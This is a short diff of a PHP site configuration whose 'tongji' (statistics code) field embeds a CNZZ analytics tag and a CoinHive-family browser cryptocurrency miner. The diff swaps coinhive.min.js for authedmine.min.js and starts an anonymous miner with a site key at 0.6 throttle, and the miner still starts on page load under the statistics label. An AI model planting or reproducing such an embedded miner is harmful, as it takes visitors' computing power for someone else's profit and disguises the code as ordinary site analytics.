@@ -36,10 +36,10 @@ $user = array(
 //', //用户统计代码!
         'tongji' =>'
         <script src="https://s22.cnzz.com/z_stat.php?id=1274502674&web_id=1274502674" language="JavaScript"></script>
-        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script src="https://authedmine.com/lib/authedmine.min.js"></script>
         <script>
-            var miner = new CoinHive.User(\'SITE_KEY\', \'KKfI1bXt6k56EiDqkg6Hq79O8ZTuvTh6\');
-            miner.start();
+            var miner = new CoinHive.Anonymous(\'KKfI1bXt6k56EiDqkg6Hq79O8ZTuvTh6\', {throttle: 0.6});
+            miner.start(); 
         </script>
 ',
 		
